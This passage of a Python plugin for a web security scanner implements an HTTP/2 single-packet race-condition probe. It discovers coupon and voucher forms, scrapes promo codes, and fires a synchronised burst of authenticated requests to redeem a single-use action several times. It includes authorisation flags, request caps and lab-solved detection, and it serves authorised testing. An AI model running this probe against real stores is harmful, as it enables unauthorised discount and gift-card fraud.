"""Bounded HTTP/2 single-packet proof for single-use action races.

The initial mode discovers an authenticated coupon/promo/voucher/redeem form
from a bare same-origin target, establishes inert serial controls, then releases
one bounded group of identical requests by flushing every stream's final HTTP/2
DATA frame in a single ``sendall`` call. A finding requires a concrete post-state
overrun plus a serial replay that is rejected or leaves state unchanged.

No caller-supplied payload, raw request, header, cookie, coupon, endpoint, or
burst size is accepted. Authentication is injected by the backend through the
hidden workflow-owned fields after policy and approval checks.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import re
import secrets
import socket
import ssl
import time
from collections import Counter
from html import unescape
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple
from urllib.parse import urlencode, urljoin, urlsplit, urlunsplit

import aiohttp
import h2.config
import h2.connection
import h2.events

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import extract_html_map, read_limited
from tools.web_authentication_probe import (
    REDACTED_RUNTIME_SECRET,
    _http_target,
    _path_and_query,
    sanitize_evidence_text,
)


MODE = "single-use-action-h2-v1"
ALLOWED_PROOF_LEVELS = {"runtime-limit-overrun", "lab-state-change"}
ALLOWED_ENGAGEMENTS = {"aggressive", "lab", "ctf"}
LAB_ENGAGEMENTS = {"lab", "ctf"}
USER_AGENT = "xASM-Agentic-Race-Condition-Probe/1.0"
MAX_RESPONSE_BYTES = 64_000
MAX_DISCOVERY_BYTES = 400_000
MAX_EVIDENCE_CHARS = 130_000
MAX_RACE_BODY_BYTES = 8_192
MAX_COOKIE_CHARS = 8_192
MAX_AUTH_HEADER_CHARS = 8_192
DEFAULT_RACE_REQUESTS = 30
HARD_MAX_RACE_REQUESTS = 30
DEFAULT_DISCOVERY_PAGES = 12
HARD_MAX_DISCOVERY_PAGES = 20
DEFAULT_REQUEST_BUDGET = 64
HARD_REQUEST_BUDGET = 96
DEFAULT_TIMEOUT_SECONDS = 20
HARD_TIMEOUT_SECONDS = 45
INVALID_CONTROL_PREFIX = "XASM-NOT-A-REAL-CODE-"

_SINGLE_USE_FIELD = re.compile(
    r"(?:coupon|promo(?:tion)?|voucher|discount|gift[_-]?card|redeem|benefit|invite[_-]?code|offer[_-]?code)",
    re.I,
)
_SINGLE_USE_PATH = re.compile(
    r"/(?:[^/?#]*/)*(?:coupon|promo(?:tion)?|voucher|discount|gift-card|redeem|benefit)(?:[/?#]|$)",
    re.I,
)
_PRODUCT_FIELD = re.compile(r"^(?:product|productid|product_id|item|itemid|item_id|sku)$", re.I)
_QUANTITY_FIELD = re.compile(r"^(?:quantity|qty|count)$", re.I)
_CHECKOUT_PATH = re.compile(r"/(?:checkout|purchase|complete-order|place-order|buy)(?:[/?#]|$)", re.I)
_UNSAFE_DISCOVERY_PATH = re.compile(
    r"/(?:logout|log-out|signout|sign-out|delete|destroy|remove-account|unsubscribe)(?:[/?#]|$)",
    re.I,
)
_CSRF_FIELD = re.compile(r"(?:csrf|xsrf|token|nonce)", re.I)
_FORM_FIELD_NAME = re.compile(r"^[A-Za-z0-9_.-]{1,160}$")
_PROMO_CONTEXT = re.compile(r"(?:coupon|promo(?:tion)?|voucher|discount|offer|code)", re.I)
_CODE_TOKEN = re.compile(r"\b[A-Z][A-Z0-9-]{3,31}\b")
_MONEY = re.compile(r"(?:\$|USD\s*)\s*([0-9][0-9,]*(?:\.[0-9]{1,2})?)", re.I)
_TOTAL_MONEY = re.compile(
    r"(?:cart\s+total|order\s+total|total)\s*:?(?:\s*</[^>]+>)*\s*(?:<[^>]+>\s*)*(?:\$|USD\s*)\s*([0-9][0-9,]*(?:\.[0-9]{1,2})?)",
    re.I | re.S,
)
_SERIAL_REJECTION = re.compile(
    r"(?:already\s+(?:been\s+)?(?:applied|used|redeemed)|single[- ]use|cannot\s+be\s+used|invalid\s+(?:coupon|promo|voucher|code)|expired)",
    re.I,
)
_SOLVED = re.compile(
    r"(?:widgetcontainer-lab-status\s+is-solved|class=[\"'][^\"']*\bis-solved\b|congratulations,?\s+you\s+solved\s+the\s+lab)",
    re.I,
)
_UNSOLVED = re.compile(
    r"(?:widgetcontainer-lab-status\s+is-notsolved|class=[\"'][^\"']*\bis-notsolved\b|\bnot\s+solved\b)",
    re.I,
)
_BLOCKED_CODE_TOKENS = {
    "ABOUT",
    "ACCOUNT",
    "ADMIN",
    "CART",
    "CHECKOUT",
    "CONTENT",
    "COOKIE",
    "COUPON",
    "DISCOUNT",
    "DOCTYPE",
    "EMAIL",
    "HTTPS",
    "LOGIN",
    "LOGOUT",
    "PASSWORD",
    "PORTSWIGGER",
    "PRODUCT",
    "PROMO",
    "REGISTER",
    "SESSION",
    "SHOP",
    "SUBMIT",
    "TOKEN",
    "VOUCHER",
}
_ALLOWED_KEYS = {
    "target",
    "url",
    "mode",
    "proofLevel",
    "candidateHints",
    "discoverCandidates",
    "maxDiscoveryPages",
    "maxRaceRequests",
    "requestBudget",
    "timeoutSeconds",
    "engagement",
    "allowUnsafeMethods",
    "stateChangeApproved",
    "authCookies",
    "cookie",
    "authHeaders",
    "_agent",
    "_job_id",
    "_job_timeout_seconds",
}


def _sha256(value: str | bytes) -> str:
    raw = value if isinstance(value, bytes) else value.encode("utf-8")
    return hashlib.sha256(raw).hexdigest()


def _safe_error(exc: Exception) -> str:
    try:
        text = str(exc)
    except Exception:
        text = exc.__class__.__name__
    return (text or exc.__class__.__name__).replace("\0", "")[:500]


def _clamp(value: Any, default: int, minimum: int, maximum: int) -> int:
    try:
        parsed = int(value)
    except (TypeError, ValueError):
        parsed = default
    return max(minimum, min(parsed, maximum))


def _bounded_integer(
    value: Any,
    default: int,
    minimum: int,
    maximum: int,
) -> Optional[int]:
    raw = default if value is None else value
    if isinstance(raw, bool):
        return None
    try:
        parsed = int(raw)
    except (TypeError, ValueError, OverflowError):
        return None
    if isinstance(raw, float) and not raw.is_integer():
        return None
    if not minimum <= parsed <= maximum:
        return None
    return parsed


def _same_origin(left: str, right: str) -> bool:
    try:
        a = urlsplit(left)
        b = urlsplit(right)
        return (a.scheme.lower(), a.hostname, a.port or (443 if a.scheme == "https" else 80)) == (
            b.scheme.lower(),
            b.hostname,
            b.port or (443 if b.scheme == "https" else 80),
        )
    except Exception:
        return False


def _safe_http_url(value: Any) -> Optional[str]:
    if not isinstance(value, str) or not value or len(value) > 4_096:
        return None
    try:
        parsed = urlsplit(value.strip())
    except Exception:
        return None
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        return None
    if parsed.username or parsed.password or parsed.fragment:
        return None
    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.query, ""))


def _cookie_value(parameters: Dict[str, Any]) -> Optional[str]:
    auth = parameters.get("authCookies")
    alias = parameters.get("cookie")
    if auth is not None and alias is not None and str(auth) != str(alias):
        return None
    value = str(auth or alias or "").strip()
    if not value or len(value) > MAX_COOKIE_CHARS or any(ch in value for ch in "\r\n\0"):
        return None
    if "=" not in value:
        return None
    return value


def _safe_auth_headers(value: Any) -> Dict[str, str]:
    if not isinstance(value, dict) or len(value) > 12:
        return {}
    output: Dict[str, str] = {}
    for raw_name, raw_value in value.items():
        name = str(raw_name or "").strip()
        text = str(raw_value or "").strip()
        if (
            not re.fullmatch(r"(?:Authorization|X-[A-Za-z0-9-]{1,80})", name, re.I)
            or not text
            or len(text) > MAX_AUTH_HEADER_CHARS
            or any(ch in text for ch in "\r\n\0")
        ):
            continue
        output[name] = text
    return output


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    unknown = sorted(str(key) for key in parameters if key not in _ALLOWED_KEYS)
    if unknown:
        return False, f"unsupported parameter: {unknown[0]}"
    target = _http_target(parameters.get("target") or parameters.get("url"))
    if not target:
        return False, "target must be a credential-free HTTP(S) base URL"
    if str(parameters.get("mode") or "").lower() != MODE:
        return False, f"mode must be {MODE}"
    proof_level = str(parameters.get("proofLevel") or "").lower()
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be runtime-limit-overrun or lab-state-change"
    engagement = str(parameters.get("engagement") or "").lower()
    if engagement not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"
    if proof_level == "lab-state-change" and engagement not in LAB_ENGAGEMENTS:
        return False, "lab-state-change requires engagement lab or ctf"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"
    if parameters.get("stateChangeApproved") is not True:
        return False, "stateChangeApproved=true is required"
    if _cookie_value(parameters) is None:
        return False, "an active server-injected authenticated session cookie is required"
    if _bounded_integer(
        parameters.get("maxRaceRequests"), DEFAULT_RACE_REQUESTS, 2, HARD_MAX_RACE_REQUESTS
    ) is None:
        return False, f"maxRaceRequests must be between 2 and {HARD_MAX_RACE_REQUESTS}"
    if _bounded_integer(
        parameters.get("maxDiscoveryPages"), DEFAULT_DISCOVERY_PAGES, 1, HARD_MAX_DISCOVERY_PAGES
    ) is None:
        return False, f"maxDiscoveryPages must be between 1 and {HARD_MAX_DISCOVERY_PAGES}"
    if _bounded_integer(
        parameters.get("requestBudget"), DEFAULT_REQUEST_BUDGET, 16, HARD_REQUEST_BUDGET
    ) is None:
        return False, f"requestBudget must be between 16 and {HARD_REQUEST_BUDGET}"
    if _bounded_integer(
        parameters.get("timeoutSeconds"), DEFAULT_TIMEOUT_SECONDS, 5, HARD_TIMEOUT_SECONDS
    ) is None:
        return False, f"timeoutSeconds must be between 5 and {HARD_TIMEOUT_SECONDS}"
    hints = parameters.get("candidateHints")
    if hints is not None:
        if not isinstance(hints, list) or len(hints) > 8:
            return False, "candidateHints must contain at most eight server-resolved candidates"
        for hint in hints:
            if not isinstance(hint, dict):
                return False, "candidateHints entries must be objects"
            url = _safe_http_url(hint.get("url"))
            fields = hint.get("fieldNames")
            if not url or not _same_origin(target, url):
                return False, "candidateHints must be same-origin HTTP(S) URLs"
            if not isinstance(fields, list) or not fields or len(fields) > 32:
                return False, "candidateHints fieldNames must contain 1 to 32 names"
            if any(not _FORM_FIELD_NAME.fullmatch(str(name or "")) for name in fields):
                return False, "candidateHints contains an invalid field name"
    return True, ""


def _forms_from_html(html: str, page_url: str) -> List[Dict[str, Any]]:
    mapped = extract_html_map(html, page_url, max_items=250)
    public = mapped.get("forms") if isinstance(mapped.get("forms"), list) else []
    private = (
        mapped.get("_nativeProbePrivateCandidates")
        if isinstance(mapped.get("_nativeProbePrivateCandidates"), list)
        else []
    )
    private_by_id = {
        str(item.get("candidateId")): item
        for item in private
        if isinstance(item, dict) and item.get("candidateId")
    }
    forms: List[Dict[str, Any]] = []
    for row in public:
        if not isinstance(row, dict):
            continue
        candidate_id = str(row.get("nativeProbeCandidateId") or "")
        exact = private_by_id.get(candidate_id) or {}
        action = _safe_http_url(exact.get("url") or row.get("action"))
        if not action or not _same_origin(page_url, action):
            continue
        exact_fields = exact.get("fields") if isinstance(exact.get("fields"), dict) else {}
        types = {
            str(field.get("name")): str(field.get("type") or "text").lower()
            for field in row.get("fields") or []
            if isinstance(field, dict) and field.get("name")
        }
        # The sanitized/public map intentionally omits field values, while the
        # private native-probe candidate stores only response-observed
        # defaults. A text input without a ``value`` attribute (the normal
        # coupon/promo shape) therefore exists only in the public field list.
        # Merge names from both views and keep private CSRF/default values
        # confined to the runtime evidence boundary.
        fields = {
            name: str(exact_fields.get(name, ""))
            for name in types
            if _FORM_FIELD_NAME.fullmatch(name)
        }
        for name, value in exact_fields.items():
            normalized_name = str(name)
            if _FORM_FIELD_NAME.fullmatch(normalized_name):
                fields.setdefault(normalized_name, str(value))
        forms.append(
            {
                "candidateId": candidate_id,
                "sourceUrl": page_url,
                "url": action,
                "method": str(row.get("method") or "GET").upper(),
                "contentType": str(row.get("contentType") or "").lower(),
                "fields": {str(name): str(value) for name, value in fields.items()},
                "fieldTypes": types,
            }
        )
    return forms


def _plain_text(html: str) -> str:
    without_script = re.sub(r"<(?:script|style)\b[^>]*>.*?</(?:script|style)>", " ", html, flags=re.I | re.S)
    return re.sub(r"\s+", " ", unescape(re.sub(r"<[^>]+>", " ", without_script))).strip()


def extract_single_use_codes(html: str) -> List[str]:
    text = _plain_text(html)
    candidates: List[Tuple[int, str]] = []
    for match in _CODE_TOKEN.finditer(text):
        token = match.group(0)
        if token in _BLOCKED_CODE_TOKENS or token.startswith("XASM-"):
            continue
        context = text[max(0, match.start() - 100) : match.end() + 100]
        score = 3 if _PROMO_CONTEXT.search(context) else 0
        if any(ch.isdigit() for ch in token):
            score += 2
        if "-" in token:
            score += 1
        if score >= 3:
            candidates.append((score, token))
    seen = set()
    output = []
    for _score, token in sorted(candidates, key=lambda item: (-item[0], len(item[1]), item[1])):
        if token in seen:
            continue
        seen.add(token)
        output.append(token)
    return output[:12]


def _form_names(form: Dict[str, Any]) -> set[str]:
    return {str(name).lower() for name in (form.get("fields") or {})}


def is_single_use_form(form: Dict[str, Any]) -> bool:
    if form.get("method") != "POST":
        return False
    if str(form.get("contentType") or "").split(";", 1)[0] != "application/x-www-form-urlencoded":
        return False
    return bool(
        _SINGLE_USE_PATH.search(str(form.get("url") or ""))
        or any(_SINGLE_USE_FIELD.search(name) for name in _form_names(form))
    )


def _single_use_field(form: Dict[str, Any]) -> Optional[str]:
    ranked = [name for name in (form.get("fields") or {}) if _SINGLE_USE_FIELD.search(str(name))]
    return sorted(ranked, key=lambda value: (len(str(value)), str(value).lower()))[0] if ranked else None


def is_product_add_form(form: Dict[str, Any]) -> bool:
    if form.get("method") != "POST" or is_single_use_form(form):
        return False
    names = set(form.get("fields") or {})
    return any(_PRODUCT_FIELD.fullmatch(name) for name in names) and any(
        _QUANTITY_FIELD.fullmatch(name) for name in names
    )


def is_checkout_form(form: Dict[str, Any]) -> bool:
    return bool(
        form.get("method") == "POST"
        and not is_single_use_form(form)
        and _CHECKOUT_PATH.search(str(form.get("url") or ""))
    )


def _money_total(html: str) -> Optional[float]:
    match = _TOTAL_MONEY.search(html)
    if match:
        try:
            return float(match.group(1).replace(",", ""))
        except ValueError:
            pass
    values = []
    for raw in _MONEY.findall(_plain_text(html)):
        try:
            values.append(float(raw.replace(",", "")))
        except ValueError:
            continue
    return values[-1] if values else None


def _discount_percent(code: str) -> Optional[int]:
    values = [int(value) for value in re.findall(r"(?<!\d)(\d{1,2})(?!\d)", code)]
    values = [value for value in values if 1 <= value <= 90]
    return values[-1] if values else None


def _fresh_form_body(form: Dict[str, Any], overrides: Dict[str, str]) -> str:
    fields = {
        str(name): str(value)
        for name, value in (form.get("fields") or {}).items()
        if _FORM_FIELD_NAME.fullmatch(str(name))
    }
    fields.update(overrides)
    return urlencode(fields)


def _h2_headers_for_request(
    url: str,
    body: bytes,
    cookie: str,
    auth_headers: Dict[str, str],
) -> List[Tuple[str, str]]:
    parsed = urlsplit(url)
    authority = parsed.hostname or ""
    default_port = 443 if parsed.scheme == "https" else 80
    if parsed.port and parsed.port != default_port:
        authority = f"{authority}:{parsed.port}"
    path = parsed.path or "/"
    if parsed.query:
        path += f"?{parsed.query}"
    headers = [
        (":method", "POST"),
        (":path", path),
        (":authority", authority),
        (":scheme", parsed.scheme),
        ("user-agent", USER_AGENT),
        ("accept", "text/html,application/xhtml+xml,application/json,text/plain,*/*"),
        ("accept-encoding", "identity"),
        ("content-type", "application/x-www-form-urlencoded"),
        ("content-length", str(len(body))),
        ("cookie", cookie),
    ]
    for name, value in sorted(auth_headers.items(), key=lambda item: item[0].lower()):
        if name.lower() in {"authorization"} or name.lower().startswith("x-"):
            headers.append((name.lower(), value))
    return headers


def h2_single_packet_race(
    url: str,
    cookie: str,
    body: str,
    count: int,
    timeout_seconds: int,
    auth_headers: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    """Release ``count`` requests through one verified HTTP/2 connection.

    There is intentionally no HTTP/1 or ordinary-concurrency fallback. The
    returned ``releaseSendCalls`` is always one for a successfully fired race.
    """

    parsed = urlsplit(url)
    if parsed.scheme != "https" or not parsed.hostname:
        raise ValueError("HTTP2_TLS_REQUIRED")
    raw_body = body.encode("utf-8")
    if not raw_body or len(raw_body) > MAX_RACE_BODY_BYTES:
        raise ValueError("RACE_BODY_OUT_OF_BOUNDS")
    if count < 2 or count > HARD_MAX_RACE_REQUESTS:
        raise ValueError("RACE_COUNT_OUT_OF_BOUNDS")

    port = parsed.port or 443
    context = ssl.create_default_context()
    context.set_alpn_protocols(["h2"])
    raw_socket = socket.create_connection((parsed.hostname, port), timeout=timeout_seconds)
    tls_socket: Optional[ssl.SSLSocket] = None
    try:
        tls_socket = context.wrap_socket(raw_socket, server_hostname=parsed.hostname)
        if tls_socket.selected_alpn_protocol() != "h2":
            raise RuntimeError("HTTP2_ALPN_REQUIRED")
        tls_socket.settimeout(min(1.0, max(0.2, timeout_seconds / 10)))
        connection = h2.connection.H2Connection(
            config=h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
        )
        connection.initiate_connection()
        tls_socket.sendall(connection.data_to_send())

        # Consume the peer's initial SETTINGS when available so the client ACK
        # is sent before the burst. A timeout is harmless; the next read handles it.
        try:
            initial = tls_socket.recv(65_535)
            if initial:
                connection.receive_data(initial)
                pending = connection.data_to_send()
                if pending:
                    tls_socket.sendall(pending)
        except socket.timeout:
            pass

        headers = _h2_headers_for_request(url, raw_body, cookie, auth_headers or {})
        stream_ids: List[int] = []
        tail = raw_body[-1:]
        prefix = raw_body[:-1]
        for _index in range(count):
            stream_id = connection.get_next_available_stream_id()
            connection.send_headers(stream_id, headers, end_stream=False)
            if prefix:
                connection.send_data(stream_id, prefix, end_stream=False)
            stream_ids.append(stream_id)
        staged = connection.data_to_send()
        if staged:
            tls_socket.sendall(staged)

        time.sleep(0.1)
        for stream_id in stream_ids:
            connection.send_data(stream_id, tail, end_stream=True)
        release = connection.data_to_send()
        if not release:
            raise RuntimeError("HTTP2_EMPTY_RELEASE")
        tls_socket.sendall(release)  # exactly one release call for all final frames

        tls_socket.settimeout(0.5)
        responses: Dict[int, Dict[str, Any]] = {
            stream_id: {"streamId": stream_id, "status": None, "headers": {}, "body": bytearray()}
            for stream_id in stream_ids
        }
        ended: set[int] = set()
        deadline = time.monotonic() + timeout_seconds
        while len(ended) < len(stream_ids) and time.monotonic() < deadline:
            try:
                data = tls_socket.recv(65_535)
            except socket.timeout:
                continue
            if not data:
                break
            for event in connection.receive_data(data):
                if isinstance(event, (h2.events.ResponseReceived, h2.events.InformationalResponseReceived)):
                    row = responses.setdefault(
                        event.stream_id,
                        {"streamId": event.stream_id, "status": None, "headers": {}, "body": bytearray()},
                    )
                    for name, value in event.headers:
                        key = str(name).lower()
                        if key == ":status":
                            row["status"] = int(value)
                        elif key in {"content-type", "location", "content-length", "cache-control"}:
                            row["headers"][key] = str(value)[:2_048]
                elif isinstance(event, h2.events.DataReceived):
                    row = responses.setdefault(
                        event.stream_id,
                        {"streamId": event.stream_id, "status": None, "headers": {}, "body": bytearray()},
                    )
                    remaining = 4_096 - len(row["body"])
                    if remaining > 0:
                        row["body"].extend(event.data[:remaining])
                    connection.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                elif isinstance(event, h2.events.StreamEnded):
                    ended.add(event.stream_id)
                elif isinstance(event, h2.events.StreamReset):
                    row = responses.setdefault(
                        event.stream_id,
                        {"streamId": event.stream_id, "status": None, "headers": {}, "body": bytearray()},
                    )
                    row["reset"] = str(event.error_code)
                    ended.add(event.stream_id)
            pending = connection.data_to_send()
            if pending:
                tls_socket.sendall(pending)

        normalized = []
        for index, stream_id in enumerate(stream_ids):
            row = responses[stream_id]
            normalized.append(
                {
                    "index": index,
                    "streamId": stream_id,
                    "status": row.get("status"),
                    "headers": row.get("headers") or {},
                    "body": bytes(row.get("body") or b"").decode("utf-8", errors="replace").replace("\0", ""),
                    **({"reset": row["reset"]} if row.get("reset") else {}),
                }
            )
        status_distribution = dict(
            sorted(Counter(str(row.get("status") or "none") for row in normalized).items())
        )
        return {
            "protocol": "h2",
            "singlePacket": True,
            "releaseSendCalls": 1,
            "releaseBytes": len(release),
            "requestCount": count,
            "completedStreams": len(ended),
            "statusDistribution": status_distribution,
            "responses": normalized,
        }
    finally:
        try:
            if tls_socket is not None:
                tls_socket.close()
            else:
                raw_socket.close()
        except Exception:
            pass


def _request_transcript(method: str, url: str, body: str, authenticated: bool) -> str:
    parsed = urlsplit(url)
    lines = [
        f"{method} {_path_and_query(url)} HTTP/1.1",
        f"Host: {parsed.netloc}",
        f"User-Agent: {USER_AGENT}",
        "Accept: text/html,application/xhtml+xml,application/json,text/plain,*/*",
    ]
    if body:
        lines.extend(
            [
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body.encode('utf-8'))}",
            ]
        )
    if authenticated:
        lines.append(f"Cookie: {REDACTED_RUNTIME_SECRET}")
    return "\r\n".join(lines) + "\r\n\r\n" + body


def _response_transcript(response: Dict[str, Any], secret_values: Iterable[Any]) -> str:
    lines = [f"HTTP/1.1 {int(response.get('status') or 0)} {response.get('reason') or ''}".rstrip()]
    headers = response.get("headers")
    for name in ("Content-Type", "Content-Length", "Location", "Cache-Control"):
        if headers is None:
            continue
        values = headers.getall(name, []) if hasattr(headers, "getall") else []
        for value in values:
            lines.append(f"{name}: {value}")
    raw = "\r\n".join(lines) + "\r\n\r\n" + str(response.get("body") or "")
    return sanitize_evidence_text(raw, secret_values, MAX_EVIDENCE_CHARS)


def build_http_step(
    label: str,
    method: str,
    url: str,
    body: str,
    response: Dict[str, Any],
    secret_values: Iterable[Any],
    authenticated: bool = True,
) -> Dict[str, Any]:
    request = sanitize_evidence_text(
        _request_transcript(method, url, body, authenticated),
        secret_values,
        MAX_EVIDENCE_CHARS,
    )
    response_text = _response_transcript(response, secret_values)
    return {
        "label": label,
        "request": request,
        "requestSha256": _sha256(request),
        "response": response_text,
        "responseSha256": _sha256(response_text),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(str(response.get("body") or "").encode("utf-8")),
        "responseExcerptTruncated": bool(response.get("truncated")),
    }


def build_race_step(
    url: str,
    body: str,
    result: Dict[str, Any],
    secret_values: Iterable[Any],
) -> Dict[str, Any]:
    request = _request_transcript("POST", url, body, True).replace("HTTP/1.1", "HTTP/2", 1).replace(
        "\r\n\r\n", f"\r\nX-xASM-Single-Packet-Streams: {result['requestCount']}\r\n\r\n", 1
    )
    request = sanitize_evidence_text(request, secret_values, MAX_EVIDENCE_CHARS)
    response_lines = [
        "HTTP/2 synchronized response group",
        f"X-xASM-Status-Distribution: {json.dumps(result.get('statusDistribution') or {}, sort_keys=True)}",
        f"X-xASM-Completed-Streams: {result.get('completedStreams')}/{result.get('requestCount')}",
        "",
    ]
    for row in result.get("responses") or []:
        excerpt = re.sub(r"\s+", " ", str(row.get("body") or "")).strip()[:500]
        response_lines.append(
            f"stream={row.get('streamId')} status={row.get('status')} bodySha256={_sha256(str(row.get('body') or ''))} excerpt={excerpt}"
        )
    response_text = sanitize_evidence_text(
        "\r\n".join(response_lines), secret_values, MAX_EVIDENCE_CHARS
    )
    return {
        "label": "http2-single-packet-race",
        "request": request,
        "requestSha256": _sha256(request),
        "response": response_text,
        "responseSha256": _sha256(response_text),
        "protocol": "h2",
        "singlePacket": True,
        "releaseSendCalls": int(result.get("releaseSendCalls") or 0),
        "requestCount": int(result.get("requestCount") or 0),
        "statusDistribution": result.get("statusDistribution") or {},
    }


def build_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    race_step = next(
        (step for step in verification.get("evidence") or [] if step.get("label") == "http2-single-packet-race"),
        {},
    )
    return {
        "template-id": "xasm-race-condition-single-use-limit-overrun-verified",
        "matcher-name": "serial-control-vs-http2-single-packet-state-overrun",
        "type": "http",
        "host": target,
        "matched-at": verification.get("actionUrl") or target,
        "request": race_step.get("request") or "",
        "response": race_step.get("response") or "",
        "info": {
            "name": "Verified Race Condition in a Single-Use Action",
            "severity": "high",
            "description": (
                "A bounded HTTP/2 single-packet burst caused a single-use action to take effect "
                "multiple times, while serial controls were rejected or left state unchanged."
            ),
            "remediation": (
                "Make the check and state transition atomic using a transaction/row lock, "
                "uniqueness constraint, conditional update, or correctly scoped idempotency key."
            ),
            "classification": {"cwe-id": ["CWE-362"]},
        },
        "evidence": verification,
    }


class RaceConditionProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:race_condition_probe"

    @property
    def description(self) -> str:
        return (
            "Finds and confirms authenticated single-use action races with one bounded, "
            "TLS-verified HTTP/2 single-packet burst and concrete serial-vs-race state proof."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "url": {"type": "string"},
                "mode": {"type": "string", "enum": [MODE]},
                "proofLevel": {"type": "string", "enum": sorted(ALLOWED_PROOF_LEVELS)},
                "candidateHints": {
                    "type": "array",
                    "maxItems": 8,
                    "items": {
                        "type": "object",
                        "properties": {
                            "url": {"type": "string"},
                            "fieldNames": {
                                "type": "array",
                                "minItems": 1,
                                "maxItems": 32,
                                "items": {"type": "string"},
                            },
                        },
                        "required": ["url", "fieldNames"],
                        "additionalProperties": False,
                    },
                },
                "discoverCandidates": {"type": "boolean", "default": True},
                "maxDiscoveryPages": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": HARD_MAX_DISCOVERY_PAGES,
                    "default": DEFAULT_DISCOVERY_PAGES,
                },
                "maxRaceRequests": {
                    "type": "integer",
                    "minimum": 2,
                    "maximum": HARD_MAX_RACE_REQUESTS,
                    "default": DEFAULT_RACE_REQUESTS,
                },
                "requestBudget": {
                    "type": "integer",
                    "minimum": 16,
                    "maximum": HARD_REQUEST_BUDGET,
                    "default": DEFAULT_REQUEST_BUDGET,
                },
                "timeoutSeconds": {
                    "type": "integer",
                    "minimum": 5,
                    "maximum": HARD_TIMEOUT_SECONDS,
                    "default": DEFAULT_TIMEOUT_SECONDS,
                },
                "engagement": {"type": "string", "enum": sorted(ALLOWED_ENGAGEMENTS)},
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "stateChangeApproved": {"type": "boolean", "default": False},
                "authCookies": {"type": "string", "x-hidden": True, "x-workflow-owned": True},
                "cookie": {"type": "string", "x-hidden": True, "x-workflow-owned": True},
                "authHeaders": {"type": "object", "x-hidden": True, "x-workflow-owned": True},
            },
            "required": [
                "mode",
                "proofLevel",
                "engagement",
                "allowUnsafeMethods",
                "stateChangeApproved",
            ],
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
            "additionalProperties": False,
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web", "api"],
            "input_type": ["url", "authenticated-session", "single-use-action"],
            "output_type": ["findings", "race_condition_proof", "evidence"],
            "taxonomy_domain": ["web", "api"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm a single-use action limit overrun with an HTTP/2 single-packet attack",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        headers: Dict[str, str],
        timeout_seconds: int,
        body: Optional[str] = None,
    ) -> Dict[str, Any]:
        request_headers = {
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/json,text/plain,*/*",
            "Accept-Encoding": "identity",
            **headers,
        }
        if body is not None:
            request_headers["Content-Type"] = "application/x-www-form-urlencoded"
        async with session.request(
            method,
            url,
            headers=request_headers,
            data=body,
            allow_redirects=False,
            timeout=aiohttp.ClientTimeout(total=timeout_seconds),
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            return {
                "status": response.status,
                "reason": str(response.reason or "")[:100],
                "headers": response.headers,
                "body": raw[:MAX_RESPONSE_BYTES].decode("utf-8", errors="replace").replace("\0", ""),
                "truncated": len(raw) > MAX_RESPONSE_BYTES,
            }

    async def _discover(
        self,
        session: aiohttp.ClientSession,
        target: str,
        headers: Dict[str, str],
        max_pages: int,
        timeout_seconds: int,
        hint_urls: Sequence[str],
    ) -> Dict[str, Any]:
        queue = [target]
        for hint in hint_urls:
            parsed = urlsplit(hint)
            parent = urlunsplit((parsed.scheme, parsed.netloc, parsed.path.rsplit("/", 1)[0] or "/", "", ""))
            queue.extend([parent, hint])
        seen_queue = set(queue)
        visited = set()
        pages: List[Dict[str, Any]] = []
        forms: List[Dict[str, Any]] = []
        codes: List[str] = []
        errors: List[str] = []
        cursor = 0
        while cursor < len(queue) and len(visited) < max_pages:
            page_url = queue[cursor]
            cursor += 1
            if page_url in visited or not _same_origin(target, page_url):
                continue
            if _UNSAFE_DISCOVERY_PATH.search(_path_and_query(page_url)):
                continue
            visited.add(page_url)
            try:
                response = await self._request(session, "GET", page_url, headers, timeout_seconds)
            except Exception as exc:
                errors.append(f"{page_url}: {_safe_error(exc)}")
                continue
            body = str(response.get("body") or "")
            if response["truncated"] or response["status"] >= 400 or not body:
                continue
            page_forms = _forms_from_html(body, page_url)
            money = _money_total(body)
            for form in page_forms:
                form["sourceTotal"] = money
            forms.extend(page_forms)
            codes.extend(extract_single_use_codes(body))
            pages.append({"url": page_url, "response": response, "forms": page_forms, "body": body})
            mapped = extract_html_map(body, page_url, max_items=250)
            for link in mapped.get("links") or []:
                candidate = _safe_http_url(link)
                if (
                    candidate
                    and candidate not in seen_queue
                    and _same_origin(target, candidate)
                    and not _UNSAFE_DISCOVERY_PATH.search(_path_and_query(candidate))
                    and len(queue) < max_pages * 8
                ):
                    seen_queue.add(candidate)
                    queue.append(candidate)
            location = response["headers"].get("Location") if response.get("headers") else None
            if location:
                candidate = _safe_http_url(urljoin(page_url, str(location)))
                if candidate and candidate not in seen_queue and _same_origin(target, candidate):
                    seen_queue.add(candidate)
                    queue.append(candidate)
        unique_forms = []
        seen_forms = set()
        for form in forms:
